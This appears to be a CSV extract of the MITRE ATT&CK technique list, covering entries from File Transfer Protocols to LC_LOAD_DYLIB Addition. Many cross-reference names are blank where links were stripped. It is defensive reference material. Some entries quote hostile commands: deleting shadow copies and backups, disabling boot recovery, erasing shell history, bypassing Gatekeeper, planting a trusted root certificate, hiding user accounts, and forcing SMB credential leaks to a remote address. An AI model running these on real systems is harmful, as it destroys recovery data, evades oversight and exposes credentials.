File Transfer Protocols,"Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",technique
File and Directory Discovery,"Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from  during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Many command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate.  Custom tools may also be used to gather file and directory information and interact with the .",technique
File and Directory Permissions Modification,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directorys existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via , , , or tainting/hijacking other instrumental binary/configuration files via .",technique
Firmware,"Before compromising a victim, adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).Adversaries may gather this information in various ways, such as direct elicitation via . Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex:  or ).",technique
Firmware Corruption,"Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot. Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices could include the motherboard, hard drive, or video cards.",technique
Forced Authentication,"Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system.  This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443.  Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. ), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server.  With access to the credential hash, an adversary can perform off-line  cracking to gain access to plaintext credentials. There are several different ways this can occur.  Some specifics from in-the-wild use include:* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. ). The document can include, for example, a request similar to file[:]//[remote address]/Normal.dotm to trigger the SMB request. * A modified .LNK or .SCF file with the icon filename pointing to an external reference such as \\[remote address]\pic.png that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. ",technique
GUI Input Capture,"Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: ).Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite. This type of prompt can be used to collect credentials via various languages such as AppleScript and PowerShell. ",technique
Gatekeeper Bypass,"Adversaries may modify file attributes that signify programs are from untrusted sources to subvert Gatekeeper controls. In macOS and OS X, when applications or programs are downloaded from the internet, there is a special attribute set on the file called com.apple.quarantine. This attribute is read by Apple's Gatekeeper defense program at execution time and provides a prompt to the user to allow or deny execution. Apps loaded onto the system from USB flash drive, optical disk, external hard drive, or even from a drive shared over the local network wont set this flag. Additionally, it is possible to avoid setting this flag using . This completely bypasses the built-in Gatekeeper check.  The presence of the quarantine flag can be checked by the xattr command xattr /path/to/MyApp.app for com.apple.quarantine. Similarly, given sudo access or elevated permission, this attribute can be removed with xattr as well, sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app.   In typical operation, a file will be downloaded from the internet and given a quarantine flag before being saved to disk. When the user tries to open the file or application, macOSs gatekeeper will step in and check for the presence of this flag. If it exists, then macOS will then prompt the user to confirmation that they want to run the program and will even provide the URL where the application came from. However, this is all based on the file being downloaded from a quarantine-savvy application. ",technique
Gather Victim Host Information,"Before compromising a victim, adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).Adversaries may gather this information in various ways, such as direct collection actions via  or . Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex:  or ). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex:  or ).",technique
Gather Victim Identity Information,"Before compromising a victim, adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, etc.) as well as sensitive details such as credentials.Adversaries may gather this information in various ways, such as direct elicitation via . Information about victims may also be exposed to adversaries via online or other accessible data sets (ex:  or ). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex: ), and/or initial access (ex:  or ).",technique
Gather Victim Network Information,"Before compromising a victim, adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.Adversaries may gather this information in various ways, such as direct collection actions via  or . Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: ). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex: ).",technique
Gather Victim Org Information,"Before compromising a victim, adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.Adversaries may gather this information in various ways, such as direct elicitation via . Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex:  or ). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex:  or ).",technique
Golden Ticket,"Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket. Golden tickets enable adversaries to generate authentication material for any account in Active Directory. Using a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.The KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets. The KRBTGT password hash may be obtained using  and privileged access to a domain controller.",technique
Graphical User Interface,"**This technique has been deprecated. Please use  where appropriate.**The Graphical User Interfaces (GUI) is a common way to interact with an operating system. Adversaries may use a system's GUI during an operation, commonly through a remote interactive session such as , instead of through a , to search for information and execute files via mouse double-click events, the Windows Run command , or other potentially difficult to monitor interactions.",technique
Group Policy Preferences,"Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:* Metasploits post exploitation module: post/windows/gather/credentials/gpp* Get-GPPPassword* gpprefdecrypt.pyOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: dir /s * .xml",technique
Hardware,"Before compromising a victim, adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).Adversaries may gather this information in various ways, such as direct collection actions via  (ex: hostnames, server banners, user agent strings) or . Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex:  or ).",technique
Hardware Additions,"Adversaries may introduce computer accessories, computers, or networking hardware into a system or network that can be used as a vector to gain access. While public references of usage by APT groups are scarce, many penetration testers leverage hardware additions for initial access. Commercial and open source products are leveraged with capabilities such as passive network tapping , man-in-the middle encryption breaking , keystroke injection , kernel memory reading via DMA , adding new wireless access to an existing network , and others.",technique
Hidden File System,"Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions. Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system. Adversaries may also fragment files across the existing file system structure in non-standard ways.",technique
Hidden Files and Directories,"Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a hidden file. These files dont show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls a for Linux and macOS).On Linux and Mac, users can mark specific files as hidden simply by putting a . as the first character in the file or folder name   . Files and folders that start with a period, ., are by default hidden from being viewed in the Finder application and standard command-line utilities like ls. Users must specifically change settings to have these files viewable.Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesnt clutter up the users workspace. For example, SSH utilities create a .ssh folder thats hidden and contains the users known hosts and keys.Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",technique
Hidden Users,"Adversaries may use hidden users to mask the presence of user accounts they create. Every user account in macOS has a userID associated with it. When creating a user, you can specify the userID for that account.There is a property value in /Library/Preferences/com.apple.loginwindow called Hide500Users that prevents users with userIDs 500 and lower from appearing at the login screen. When using the  technique with a userID under 500 (ex: sudo dscl . -create /Users/username UniqueID 401) and enabling this property (setting it to Yes), an adversary can conceal user accounts. .",technique
Hidden Window,"Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. On Windows, there are a variety of features in scripting languages in Windows, such as , Jscript, and  to make windows hidden. One example of this is powershell.exe -WindowStyle Hidden. Similarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be apple.awt.UIElement, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.",technique
Hide Artifacts,"Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.",technique
Hijack Execution Flow,"Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",technique
Hypervisor,**This technique has been deprecated and should no longer be used.**A type-1 hypervisor is a software layer that sits between the guest operating systems and system's hardware.  It presents a virtual running environment to an operating system. An example of a common hypervisor is Xen.  A type-1 hypervisor operates at a level below the operating system and could be designed with  functionality to hide its existence from the guest operating system.  A malicious hypervisor of this nature could be used to persist on systems through interruption.,technique
IP Addresses,"Before compromising a victim, adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.Adversaries may gather this information in various ways, such as direct collection actions via  or . Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: ). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex: ).",technique
Identify Business Tempo,"Before compromising a victim, adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organizations business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victims hardware and software resources.Adversaries may gather this information in various ways, such as direct elicitation via . Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex:  or ). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex:  or )",technique
Identify Roles,"Before compromising a victim, adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.Adversaries may gather this information in various ways, such as direct elicitation via . Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex:  or ). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex: ).",technique
Image File Execution Options Injection,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an applications IFEO will be prepended to the applications name, effectively launching the new process under the debugger (e.g., C:\dbg\ntsd.exe -g  notepad.exe). IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.  IFEOs are represented as Debugger values in the Registry under HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable> where &lt;executable&gt; is the binary on which the debugger is attached. IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).   Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\.  Similar to , on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with  will cause the ""debugger"" program to be executed with SYSTEM privileges. Similar to , these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.  Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.Malware may also use IFEO to  by registering invalid debuggers that redirect and effectively disable various system and security applications.  ",technique
Impair Command History Logging,"Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. On Linux and macOS, command history is tracked in a file pointed to by the environment variable HISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called ~/.bash_history. The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected.Adversaries may clear the history environment variable (unset HISTFILE) or set the command history size to zero (export HISTFILESIZE=0) to prevent logging of commands. Additionally, HISTCONTROL can be configured to ignore commands that start with a space by simply setting it to ""ignorespace"". HISTCONTROL can also be set to ignore duplicate commands by setting it to ""ignoredups"". In some Linux systems, this is set by default to ""ignoreboth"" which covers both of the previous examples. This means that  ls will not be saved, but ls would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands.On Windows systems, the PSReadLine module tracks commands used in all PowerShell sessions and writes them to a file ($env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt by default). Adversaries may change where these logs are saved using Set-PSReadLineOption -HistorySavePath {File Path}. This will cause ConsoleHost_history.txt to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command Set-PSReadlineOption -HistorySaveStyle SaveNothing.",technique
Impair Defenses,"Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.",technique
Implant Container Image,"Adversaries may implant cloud container images with malicious code to establish persistence. Amazon Web Service (AWS) Amazon Machine Images (AMI), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.A tool has been developed to facilitate planting backdoors in cloud container images. If an attacker has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a . Adversaries may also implant Docker images that may be inadvertently used in cloud deployments, which has been reported in some instances of cryptomining botnets. ",technique
Indicator Blocking,"An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting  or even disabling host-based sensors, such as Event Tracing for Windows (ETW), by tampering settings that control the collection and flow of event telemetry.  These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as  or .ETW interruption can be achieved multiple ways, however most directly by defining conditions using the  Set-EtwTraceProvider cmdlet or by interfacing directly with the Registry to make alterations.In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. ",technique
Indicator Removal from Tools,"Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.",technique
Indicator Removal on Host,"Adversaries may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware. Locations and format of logs are platform or product-specific, however standard operating system logs are captured as Windows events or Linux/macOS files such as  and /var/log/*.These actions may interfere with event collection, reporting, or other notifications used to detect intrusion activity. This that may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",technique
Indirect Command Execution,"Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking . For example, , the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a , Run window, or via scripts.  Adversaries may abuse these features for , specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of  or file extensions more commonly associated with malicious payloads.",technique
Ingress Tool Transfer,"Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.",technique
Inhibit System Recovery,"Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of  and .A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:* vssadmin.exe can be used to delete all volume shadow copies on a system - vssadmin.exe delete shadows /all /quiet*  can be used to delete volume shadow copies - wmic shadowcopy delete* wbadmin.exe can be used to delete the Windows Backup Catalog - wbadmin.exe delete catalog -quiet* bcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data - bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no",technique
Input Capture,"Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. ) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. ).",technique
Install Root Certificate,"Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.  Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. In macOS, the Ay MaMi malware uses /usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert to install a malicious certificate as a trusted root certificate into the system keychain. ",technique
InstallUtil,Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries.  InstallUtil is digitally signed by Microsoft and located in the .NET directories on a Windows system: C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe and C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe.InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute [System.ComponentModel.RunInstaller(true)]. ,technique
Inter-Process Communication,"Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. Adversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows  or . Higher level execution mediums, such as those of s, may also leverage underlying IPC mechanisms.",technique
Internal Defacement,"An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper. Disturbing or offensive images may be used as a part of  in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.",technique
Internal Proxy,"Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including , ZXProxy, and ZXPortMap.  Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.By using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",technique
Internal Spearphishing,"Adversaries may use internal spearphishing to gain access to additional information or exploit other users within the same organization after they already have access to accounts or systems within the environment. Internal spearphishing is multi-staged attack where an email account is owned either by controlling the user's device with previously installed malware or by compromising the account credentials of the user. Adversaries attempt to take advantage of a trusted internal account to increase the likelihood of tricking the target into falling for the phish attempt.Adversaries may leverage  or  as part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials through  on sites that mimic email login interfaces.There have been notable incidents where internal spearphishing has been used. The Eye Pyramid campaign used phishing emails with malicious attachments for lateral movement between victims, compromising nearly 18,000 email accounts in the process. The Syrian Electronic Army (SEA) compromised email accounts at the Financial Times (FT) to steal additional account credentials. Once FT learned of the attack and began warning employees of the threat, the SEA sent phishing emails mimicking the Financial Times IT department and were able to compromise even more users.",technique
Invalid Code Signature,"Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.Unlike , this activity will not result in a valid signature.",technique
JavaScript/JScript,"Adversaries may abuse JavaScript and/or JScript for execution. JavaScript (JS) is a platform-agnostic scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the  and Internet Explorer HTML Application (HTA) pages.Adversaries may abuse JavaScript / JScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a  or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of .",technique
Junk Data,"Adversaries may add junk data to protocols used for command and control to make detection more difficult. By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters. ",technique
Kerberoasting,"Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to . Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline  attacks that may expose plaintext credentials. This same attack could be executed using service tickets captured from network traffic.Cracked hashes may enable , , and  via access to .",technique
Kernel Modules and Extensions,"Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. When used maliciously, LKMs can be a type of kernel-mode  that run with the highest operating system privilege (Ring 0). Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. Kernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through kextload and kextunload commands.Adversaries can use LKMs and kexts to covertly persist on a system and elevate privileges. Examples have been found in the wild and there are some open source projects.      ",technique
Keychain,"Adversaries may collect the keychain storage data from a system to acquire credentials. Keychains are the built-in way for macOS to keep track of users' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in ~/Library/Keychains/,/Library/Keychains/, and /Network/Library/Keychains/.  The security command-line utility, which is built into macOS by default, provides a useful way to manage these credentials.To manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault.  By default, the passphrase for the keychain is the users logon credentials.",technique
Keylogging,"Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when  efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured.Keylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:* Hooking API callbacks used for processing keystrokes. Unlike , this focuses solely on API functions intended for processing keystroke data.* Reading raw keystroke data from the hardware buffer.* Windows Registry modifications.* Custom drivers.*  may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions. ",technique
LC_LOAD_DYLIB Addition,"Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.  There are tools available to perform these changes.Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isnt checked at load time. ",technique
